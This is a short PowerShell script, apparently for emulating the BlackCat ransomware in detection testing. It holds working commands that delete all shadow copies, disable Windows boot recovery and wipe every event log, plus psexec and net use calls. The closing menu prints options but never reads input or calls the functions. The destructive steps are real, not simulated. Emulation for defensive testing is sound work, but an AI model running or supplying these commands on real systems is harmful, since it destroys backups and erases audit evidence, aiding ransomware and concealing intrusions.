function dissableSystemRecovery()
{
#dissables system recovery methods
vssadmin.exe delete shadows /all /quiet
wmic.exe Shadowcopy Delete
bcdedit /set {default} recoveryenabled No
}

function clearLogs()
{
#loops through all event logs and deletes them
wevtutil el | Foreach-Object {wevtutil cl "$_"}
}

function netUse()
{
#simulates using the net use command with persistence turned off
net use /persistent:no
}

function psExec()
{
#runns the psexec command with -accepteula to simulate blackcat
.\PSTools\psexec.exe -accepteula
}

Write-Output "Please select a option"
Write-Output "1: dissable system recovery"
Write-Output "2: clear event logs"
Write-Output "3: run psExec"
Write-Output "exit: exit script"
